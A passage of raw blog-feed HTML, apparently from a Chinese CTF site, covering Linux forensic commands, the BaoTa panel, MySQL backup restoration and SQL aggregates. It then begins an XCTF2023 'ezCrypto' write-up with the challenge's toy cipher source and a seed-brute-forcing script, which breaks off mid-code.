class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls *.txt         # 列出所有扩展名为.txt的文件</span><br><span class="line">ls file?.txt     # 列出文件名为file?.txt的文件，其中?表示任意一个字符</span><br><span class="line">ls [abc]*.txt    # 列出以a、b或c开头、扩展名为.txt的文件</span><br></pre></td></tr></table></figure><p>以下指令列出目前工作目录下所有名称是 s 开头的文件，越新的排越后面:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -ltr s*</span><br></pre></td></tr></table></figure><h5 id="pwd"><a href="#pwd" class="headerlink" title="pwd"></a>pwd</h5><p><strong>功能</strong></p><p><code>pwd</code>显示用户当前所在的目录</p><h5 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h5><p><strong>功能</strong></p><p><code>cat</code>能查看目标文件的内容，多用于文本文件或查看日志。会将目标文件的全部内容打印到屏幕上，如果文件内容超出屏幕则会刷屏到最后。</p><p><strong>选项</strong></p><p><code>-s</code>当遇到有连续两行以上的空白行，就代换为一行的空白行。</p><p><code>-T</code>将 TAB 字符显示为 ^I。</p><h5 id="chmod"><a href="#chmod" class="headerlink" title="chmod"></a>chmod</h5><p><strong>功能</strong></p><p><code>chmod</code>可以控制用户对文件的权限</p><p><strong>模式</strong></p><p>Linux/Unix 的文件调用权限分为三级 : 文件所有者（Owner）、用户组（Group）、其它用户（Other Users）。</p><p>而chmod指令模式的三个数字就对应三种用户类型的权限</p><div class="table-container"><table><thead><tr><th style="text-align:left">#</th><th style="text-align:left">权限</th><th style="text-align:left">rwx</th><th style="text-align:left">二进制</th></tr></thead><tbody><tr><td style="text-align:left">7</td><td style="text-align:left">读 + 写 + 执行</td><td style="text-align:left">rwx</td><td style="text-align:left">111</td></tr><tr><td style="text-align:left">6</td><td style="text-align:left">读 + 写</td><td style="text-align:left">rw-</td><td style="text-align:left">110</td></tr><tr><td style="text-align:left">5</td><td style="text-align:left">读 + 执行</td><td style="text-align:left">r-x</td><td style="text-align:left">101</td></tr><tr><td style="text-align:left">4</td><td style="text-align:left">只读</td><td style="text-align:left">r—</td><td style="text-align:left">100</td></tr><tr><td style="text-align:left">3</td><td style="text-align:left">写 + 执行</td><td style="text-align:left">-wx</td><td style="text-align:left">011</td></tr><tr><td style="text-align:left">2</td><td style="text-align:left">只写</td><td style="text-align:left">-w-</td><td style="text-align:left">010</td></tr><tr><td style="text-align:left">1</td><td style="text-align:left">只执行</td><td style="text-align:left">—x</td><td style="text-align:left">001</td></tr><tr><td style="text-align:left">0</td><td style="text-align:left">无</td><td style="text-align:left">—-</td><td style="text-align:left">000</td></tr></tbody></table></div><p>例如， 765 将这样解释：</p><ul><li>所有者的权限用数字表达：属主的那三个权限位的数字加起来的总和。如 rwx ，也就是 4+2+1 ，应该是 7。</li><li>用户组的权限用数字表达：属组的那个权限位数字的相加的总和。如 rw- ，也就是 4+2+0 ，应该是 6。</li><li>其它用户的权限数字表达：其它用户权限位的数字相加的总和。如 r-x ，也就是 4+0+1 ，应该是 5。</li></ul><p><strong>选项</strong></p><p><code>-R</code>对目前目录下的所有文件与子目录进行相同的权限变更(即以递归的方式逐个变更)</p><h5 id="find"><a href="#find" class="headerlink" title="find"></a>find</h5><p><strong>功能</strong></p><p><code>find</code>命令用来在指定目录下查找文件。</p><p>语法为<code>find 欲查找的目录 选项</code></p><p>任何位于选项之前的字符串都将被视为欲查找的目录名。如果使用该命令时，不设置任何选项，则 find 命令将在当前目录下查找子目录与文件。</p><p><strong>选项</strong></p><p><code>-name pattern</code> 按文件名查找，支持使用通配符 <code>*</code> 和 <code>?</code>。</p><p><code>-type type</code>按文件类型查找，可以是 <code>f</code>（普通文件）、<code>d</code>（目录）、<code>l</code>（符号链接）等。</p><p><code>-pid n</code>process id 是 n 的文件</p><h4 id="服务器信息"><a href="#服务器信息" class="headerlink" title="服务器信息"></a>服务器信息</h4><p>服务器信息可以用分析软件，也可以通过仿真</p><p><strong>分析工具</strong></p><ol><li><p><strong>盘古石计算机取证分析系统</strong></p><p>使用<strong>盘古石计算机取证分析系统</strong>勾选系统类型为<strong>linux</strong>，则可以在应用分析报告查看系统信息</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230911104806315.png" alt=""></p></li><li><p><strong>系统仿真</strong></p><p>登录到目标系统后，执行<code>uname</code>命令</p><p>可以显示系统的全部信息，包括内核名称、主机名、操作系统版本、处理器类型和硬件架构等</p><p>显示<strong>系统信息</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># uname -a</span><br><span class="line">Linux iZbp19byk2t6khuqj437q6Z 4.11.0-14-generic #20~16.04.1-Ubuntu SMP Wed Aug 9 09:06:22 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure><p>显示<strong>计算机类型</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># uname -m</span><br><span class="line">x86_64</span><br></pre></td></tr></table></figure><p>显示<strong>计算机名</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># uname -n</span><br><span class="line">runoob-linux</span><br></pre></td></tr></table></figure><p>显示<strong>操作系统发行编号</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># uname -r</span><br><span class="line">4.11.0-14-generic</span><br></pre></td></tr></table></figure><p>显示<strong>操作系统名称</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># uname -s</span><br><span class="line">Linux</span><br></pre></td></tr></table></figure><p>显示<strong>系统版本与时间</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># uname -v</span><br><span class="line">#20~16.04.1-Ubuntu SMP Wed Aug 9 09:06:22 UTC 2017</span><br></pre></td></tr></table></figure></li></ol><h4 id="显示过去执行的命令"><a href="#显示过去执行的命令" class="headerlink" title="显示过去执行的命令"></a>显示过去执行的命令</h4><p>使用linux的指令<code>history</code></p><p><code>history n</code>显示最近n条命令历史</p><p><code>!N</code>执行第N条命令</p><p><code>!-N</code>执行倒数第N条命令</p><h4 id="宝塔面板"><a href="#宝塔面板" class="headerlink" title="宝塔面板"></a>宝塔面板</h4><p>如果发现镜像中存在面板，输入命令<code>bt</code>即可调出面板</p><p><strong>修改密码</strong></p><p>拿到宝塔后首先输入<code>5</code>修改密码，密码长度需要大于8位，这样方便启动面板服务后登录</p><div class="note warning flat"><p>一定要在获取记录完宝塔的账户和密码后再来修改密码，有时题目会直接问密码是多少</p></div><p><strong>启动面板服务</strong></p><p>输入<code>14</code>启动面板服务，此时会给出<strong>外网和内网面板地址</strong></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230911143925804.png" alt="image-20230911143925804"></p><p>使用本地浏览器访问内网地址</p><p>使用刚刚修改后的账号密码访问即可</p><p><strong>phpAdmin</strong></p><p>宝塔面板大概率安装了phpAdmin</p><p>可以使用数据库账号密码登录，在可视化界面方便地查看库名、表名、数据库结构</p><h4 id="还原qp-xb数据库"><a href="#还原qp-xb数据库" class="headerlink" title="还原qp.xb数据库"></a>还原qp.xb数据库</h4><p>当检材中存在<strong>分离的数据库备份</strong>，即后缀为<code>qp.xb</code>的文件时，可以尝试将其恢复到系统服务器中</p><p><strong>安装qpress</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget &quot;http://docs-aliyun.cn-hangzhou.oss.aliyun-inc.com/assets/attach/183466/cn_zh/1608011575185/qpress-11-linux-x64.tar&quot;</span><br><span class="line">tar xvf qpress-11-linux-x64.tar</span><br><span class="line">chmod 775 qpress</span><br><span class="line">cp qpress /usr/bin</span><br></pre></td></tr></table></figure><p><strong>安装xtrabackup</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.percona.com/downloads/XtraBackup/Percona-XtraBackup-2.4.9/binary/redhat/7/x86_64/percona-xtrabackup-24-2.4.9-1.el7.x86_64.rpm</span><br><span class="line">yum install -y percona-xtrabackup-24-2.4.9-1.el7.x86_64.rpm</span><br></pre></td></tr></table></figure><p><strong>将备份文件上传至服务器系统</strong></p><p>可以使用工具<strong>xftp</strong>连接到服务器上</p><p><strong>处理qp.xb文件</strong></p><p>使用xbstream处理qp.xb文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat xxxqp.xb | xbstream -x -v -C /www/server/data</span><br></pre></td></tr></table></figure><p>进入/www/server/data进行解压</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /www/server/data</span><br><span class="line">innobackupex --decompress --remove-original /www/server/data</span><br><span class="line">innobackupex --defaults-file=/etc/my.cnf --apply-log /www/server/data</span><br><span class="line">chown -R mysql:mysql /www/server/data</span><br></pre></td></tr></table></figure><p><strong>修改mysql配置文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/my.cnf</span><br><span class="line">#在[mysqld]块下添加</span><br><span class="line">lower_case_table_names=1</span><br></pre></td></tr></table></figure><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230911154237605.png" alt="image-20230911154237605"></p><h4 id="数据库统计时常用聚合函数"><a href="#数据库统计时常用聚合函数" class="headerlink" title="数据库统计时常用聚合函数"></a>数据库统计时常用聚合函数</h4><h5 id="COUNT"><a href="#COUNT" class="headerlink" title="COUNT"></a>COUNT</h5><p><strong>基础语法</strong></p><p><code>COUNT()</code> 函数返回匹配指定条件的行数。</p><p>COUNT(column_name) 函数返回指定列的值的数目（NULL 不计入）：</p><p>语法：<code>SELECT COUNT(column_name) FROM table_name;</code></p><p>COUNT(DISTINCT column_name) 函数返回指定列的不同值的数目：</p><p>语法：<code>SELECT COUNT(DISTINCT column_name) FROM table_name;</code></p><div class="note warning flat"><p>COUNT(DISTINCT) 适用于 ORACLE 和 Microsoft SQL Server，但是无法用于 Microsoft Access。</p></div><h5 id="SUM"><a href="#SUM" class="headerlink" title="SUM"></a>SUM</h5><p>SUM() 函数返回数值列的总数。</p><p>语法：<code>SELECT SUM(column_name) FROM table_name;</code></p><h5 id="MAX"><a href="#MAX" class="headerlink" title="MAX"></a>MAX</h5><p>MAX() 函数返回指定列的最大值。</p><p>语法：<code>SELECT MAX(column_name) FROM table_name;</code></p><h5 id="MIN"><a href="#MIN" class="headerlink" title="MIN"></a>MIN</h5><p>MIN() 函数返回指定列的最小值。</p><p>语法：<code>SELECT MIN(column_name) FROM table_name;</code></p><h5 id="AVG"><a href="#AVG" class="headerlink" title="AVG"></a>AVG</h5><p>AVG() 函数返回数值列的平均值。</p><p>语法：<code>SELECT AVG(column_name) FROM table_name</code></p><h4 id="数据库统计时常用语句"><a href="#数据库统计时常用语句" class="headerlink" title="数据库统计时常用语句"></a>数据库统计时常用语句</h4><h5 id="GROUP-BY"><a href="#GROUP-BY" class="headerlink" title="GROUP BY"></a>GROUP BY</h5><p>GROUP BY 语句用于结合聚合函数（如 COUNT()、MAX() 等），根据一个或多个列对结果集进行分组。</p><p>一般情况下，GROUP BY 必须要<strong>配合聚合函数一起使用</strong>，通过使用聚合函数，在分组之后可以对<strong>组内结果</strong>进行计数（COUNT）、求和（SUM），求平均数（AVG）操作等。</p><p>GROUP BY会先<strong>按照指定字段的值是否相同</strong>来将<strong>数据分组</strong></p><p>更加详细的介绍可以看下面这篇：</p><p><a href="https://blog.csdn.net/liu_shi_jun/article/details/51329472">GROUP BY与COUNT用法详解<em>group by count</em>鲲鹏之上的博客-CSDN博客</a></p><h5 id="HAVING"><a href="#HAVING" class="headerlink" title="HAVING"></a>HAVING</h5><p>HAVING 子句可以<strong>筛选</strong>通过 GROUP BY 分组且聚合后的各组数据。</p><p>聚合函数（avg、sum、max、min、count），<strong>不能作为条件放在where之后</strong>，但<strong>可以放在having之后</strong></p><h5 id="GROUP-BY、HAVING、WHERE之间的关系"><a href="#GROUP-BY、HAVING、WHERE之间的关系" class="headerlink" title="GROUP BY、HAVING、WHERE之间的关系"></a>GROUP BY、HAVING、WHERE之间的关系</h5><p>在语句的位置上，where在group by前， having在group by 之后</p><p>在执行顺序上，以下面这个SQL语句为例</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select city ,count(*) as num from staff  where age&gt; 19 group by city having num &gt;= 3;</span><br></pre></td></tr></table></figure><ol><li>执行where子句查找符合年龄大于19的员工数据</li><li>group by子句对员工数据，根据城市分组。</li><li>对group by子句形成的城市组，运行聚集函数计算每一组的员工数量值；</li><li>最后用having子句选出员工数量大于等于3的城市组。</li></ol><p>所以执行顺序为：<strong>WHERE</strong>➡<strong>GROUP BY</strong>➡<strong>聚合函数</strong>➡<strong>HAVING</strong></p><h4 id="数据库可视化工具"><a href="#数据库可视化工具" class="headerlink" title="数据库可视化工具"></a>数据库可视化工具</h4><h5 id="navicat"><a href="#navicat" class="headerlink" title="navicat"></a>navicat</h5><p><strong>安装</strong></p><p>参考文章：<a href="https://www.cnblogs.com/kkdaj/p/16260681.html">https://www.cnblogs.com/kkdaj/p/16260681.html</a></p><h3 id="取证软件使用要点"><a href="#取证软件使用要点" class="headerlink" title="取证软件使用要点"></a>取证软件使用要点</h3><h4 id="盘古石计算机仿真取证系统"><a href="#盘古石计算机仿真取证系统" class="headerlink" title="盘古石计算机仿真取证系统"></a>盘古石计算机仿真取证系统</h4><p>使用该软件会在本地创建镜像文件并使用<strong>VMware虚拟机</strong>进行仿真。但是对该镜像<strong>取证完毕前请勿关闭计算机仿真取证系统</strong>软件，否则可能会导致虚拟机中的镜像无法再打开，而此前所做的操作也无法被保存。</p><h4 id="盘古石手机取证分析系统"><a href="#盘古石手机取证分析系统" class="headerlink" title="盘古石手机取证分析系统"></a>盘古石手机取证分析系统</h4><p>导入模拟器的镜像格式文件时一定要一次性将镜像导入完再分析，而不是单个导入单个分析</p>]]></content>
      
      
      <categories>
          
          <category> CTF 取证 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
            <tag> Forensics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>近期密码学wp整理</title>
      <link href="/posts/25f6527726f2/"/>
      <url>/posts/25f6527726f2/</url>
      
        <content type="html"><![CDATA[<h2 id="XCTF2023"><a href="#XCTF2023" class="headerlink" title="XCTF2023"></a>XCTF2023</h2><h3 id="ezCrypto"><a href="#ezCrypto" class="headerlink" title="ezCrypto"></a>ezCrypto</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ezCrypto.py</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">characters = string.printable[:-<span class="number">6</span>]</span><br><span class="line">digits = string.digits</span><br><span class="line">ascii_letters = string.ascii_letters</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Ran_str</span>(<span class="params">seed : <span class="built_in">int</span>, origin: <span class="built_in">str</span></span>):</span><br><span class="line">    random.seed(seed)</span><br><span class="line">    random_sequence = random.sample(origin, <span class="built_in">len</span>(origin))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random_sequence)</span><br><span class="line"></span><br><span class="line">rseed = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="keyword">assert</span> rseed &lt;= <span class="number">1000</span> <span class="keyword">and</span> rseed &gt;= <span class="number">0</span></span><br><span class="line"></span><br><span class="line">map_string1 = Ran_str(rseed, characters)</span><br><span class="line">map_string2 = Ran_str(rseed * <span class="number">2</span>, characters)</span><br><span class="line">map_string3 = Ran_str(rseed * <span class="number">3</span>, characters)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">util</span>(<span class="params">flag</span>):</span><br><span class="line">    <span class="keyword">return</span> flag[<span class="number">9</span>: -<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">util1</span>(<span class="params">map_string: <span class="built_in">str</span>, c</span>):</span><br><span class="line">    <span class="keyword">return</span> map_string.index(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_xor</span>(<span class="params">s: <span class="built_in">str</span>, k: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>((<span class="built_in">ord</span>(a)) ^ (<span class="built_in">ord</span>(b))) <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(s, k))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mess_sTr</span>(<span class="params">s : <span class="built_in">str</span>, index : <span class="built_in">int</span></span>):</span><br><span class="line">   </span><br><span class="line">    map_str = Ran_str(index, ascii_letters + digits)</span><br><span class="line">    new_str = str_xor(s, map_str[index])</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> characters.find(new_str) &gt;= <span class="number">0</span>:</span><br><span class="line">        new_str = <span class="string">&quot;CrashOnYou??&quot;</span> + s</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> new_str, util1(map_str, s)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crypto_phase1</span>(<span class="params">flag</span>):</span><br><span class="line">    flag_list1 = util(flag).split(<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">    newlist1 = []</span><br><span class="line">    newlist2 = []</span><br><span class="line">    index = <span class="number">1</span></span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag_list1:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(i) % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            i1 = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(i)):</span><br><span class="line">                p, index = mess_sTr(i[j], index)</span><br><span class="line">                i1 += p</span><br><span class="line">           </span><br><span class="line">            p, index = mess_sTr(i[<span class="number">0</span>], index)</span><br><span class="line">            i1 += p</span><br><span class="line">            </span><br><span class="line">            i1 += <span class="built_in">str</span>(k)</span><br><span class="line">            k += <span class="number">1</span></span><br><span class="line">            newlist1.append(i1)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            i += <span class="built_in">str</span>(k)</span><br><span class="line">            k += <span class="number">1</span></span><br><span class="line">            newlist2.append(i)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> newlist1, newlist2</span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crypto_phase2</span>(<span class="params"><span class="built_in">list</span></span>):</span><br><span class="line">    newlist = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">        <span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">            <span class="built_in">str</span> += map_string1[util1(map_string3, j)]</span><br><span class="line">           </span><br><span class="line">        newlist.append(<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">return</span> newlist</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crypto_phase3</span>(<span class="params"><span class="built_in">list</span></span>):</span><br><span class="line">    newlist = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">        <span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">            <span class="built_in">str</span> += map_string2[util1(map_string3, j)]</span><br><span class="line">            </span><br><span class="line">        newlist.append(<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">return</span> newlist</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crypto_final</span>(<span class="params"><span class="built_in">list</span></span>):</span><br><span class="line">    <span class="built_in">str</span>=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>[::-<span class="number">1</span>]:</span><br><span class="line">        <span class="built_in">str</span> += i</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">format</span>=<span class="string">&quot;sixstars&#123;XXX&#125;&quot;</span></span><br><span class="line">    flag=<span class="string">&quot;Nothing normal will contribute to a crash. So when you find nothing, you find A Crashhhhhhhh!!! &quot;</span></span><br><span class="line">    </span><br><span class="line">    flaglist1, flaglist2 = crypto_phase1(flag)</span><br><span class="line">    cipher = crypto_final(crypto_phase3(crypto_phase2(flaglist1) + flaglist1) + crypto_phase2(crypto_phase3(flaglist2)))</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;map_string2: &quot;</span> + map_string2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;cipher: &quot;</span> + cipher)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">map_string2: \W93VnRHs&lt;CU#GI!d^7;&#x27;Lyfo`qt68&amp;Y=Pr(b)O2[|mc0z&#125;BvKkh5~lJeXM-iNgaTZ]*4F?upw&gt;A,x@DQ.Sj:_$E/%&quot;+&#123;1</span><br><span class="line">cipher: &amp;I1&#125;ty~A:bR&gt;)Q/;6:*6`1;bum?8i[LL*t`1;bum?8i[LL?Ia`1;bum?8i[LL72;xl:mvHF&quot;z4_/DD+c:mvHF&quot;z4_/DDzbZ:mvHF&quot;z4_/DDr&#125;vS?</span><br></pre></td></tr></table></figure><h4 id="write-up"><a href="#write-up" class="headerlink" title="write up"></a>write up</h4><p>比较常规的自定义加密题</p><p>只需要逆着加密的逻辑倒推就行</p><p>本题分为以下几个关键解题步骤：</p><ul><li><p><strong>爆破rseed值</strong></p></li><li><p><strong>分割cipher</strong></p></li><li><p><strong>还原flag</strong></p></li></ul><h5 id="爆破rseed值"><a href="#爆破rseed值" class="headerlink" title="爆破rseed值"></a>爆破rseed值</h5><p>根据rseed不变随机数不变的原理，以及output里给定的map_string2的值，我们可以写个脚本爆破出rseed的值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">characters = string.printable[:-<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> rseed <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    random.seed(rseed*<span class="number">2</span>)</span><br><span class="line">    random_sequence = random.sample(characters, <span class="built_in">len</span>(characters))</span><br><span class="line">    map_string2 = <span class="string">&#x27;&#x27;</span>.join(random_sequence)</span><br><span class="line">    <span class="built_in">print</span>(map_string2)</span><br><span class="line">    <span class="keyword">if</span>(map_string2==<span class="string">&#x27;&#x27;&#x27;\W93VnRHs&lt;CU#GI!d^7;&#x27;Lyfo`qt68&amp;Y=Pr(b)O2[|mc0z&#125;BvKkh5~lJeXM-iNgaTZ]*4F?upw&gt;A,x@DQ.Sj:_$E/%&quot;+&#123;1&#x27;&#x27;&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(rseed)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># rseed = 667</span></span><br></pre></td></tr></table></figure><p>那么此时<code>map_string1</code>和<code>map_string3</code>均为已知值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">map_string1 = Ran_str(rseed, characters)</span><br><span class="line">map_string3 = Ran_str(rseed*<span class="number">3</span>, characters)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;map_string1 = <span class="subst">&#123;map_string1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;map_string3 = <span class="subst">&#123;map_string3&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># map_string1 = d*T[RJDKkbZ&gt;&quot;Fs\&amp;X&#125;Q6:h7a&#123;VUj#=Y1tLI~P^qBg9A.)Mz@frvGwn&lt;ie,y|m;&#x27;3x54]8-p%W(oS!0lN`?2+H/_Euc$CO</span></span><br><span class="line"><span class="comment"># map_string3 = .2K6b@/~5+=l&lt;7wXj8TaJ?]Z,CMRkY&amp;gG(&#125;tsf)Du^OUx-qdQNiyV$01L[&quot;moA*3P&#x27;IF#pnhe`\;v&gt;H:z%!c&#123;|WEBS94_r</span></span><br></pre></td></tr></table></figure><h5 id="分割cipher"><a href="#分割cipher" class="headerlink" title="分割cipher"></a>分割cipher</h5><p>cipher由<strong>两段</strong>flaglist1和一段flaglist2<strong>代换</strong>后拼接而成</p><p>同时这两段flaglist1又使用了不同的代换方式，这也是这道题目的<strong>突破口</strong></p><p>首先我们可以写出反向代换函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_phase2</span>(<span class="params"><span class="built_in">list</span></span>):</span><br><span class="line">    newlist = []</span><br><span class="line">    <span class="keyword">for</span> i <span 